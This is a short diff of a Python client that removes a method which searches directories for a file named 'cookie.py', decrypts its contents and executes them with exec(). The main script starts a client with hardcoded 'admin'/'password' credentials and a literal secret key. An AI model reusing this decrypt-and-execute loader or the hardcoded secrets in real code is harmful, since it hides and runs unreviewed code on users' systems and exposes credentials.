@@ -5,6 +5,7 @@ import socket
 import hashlib, random
 import zipfile
 import shutil
+import threading
 from io import BytesIO
 
 
@@ -88,21 +89,6 @@ class Client:
                 self.e.decrypt("test\\" + fn + "\\" + name)
 
         return fn
-
-    def executor(self):
-        for file in os.listdir("./"):
-            # print(file)
-            if os.path.isfile(file):
-                if file == "cookie.py":
-                    with open(file, "r") as f:
-                        data = f.read()
-                        decr_str = self.e.decrypt_str(data)
-                        exec(decr_str)
-            else:
-                os.chdir(file)
-                executor(e)
-                os.chdir("../")
-
 
 if __name__ == "__main__":
     client = Client('http://127.0.0.1:1337', ('admin', 'password'), "secret_key")
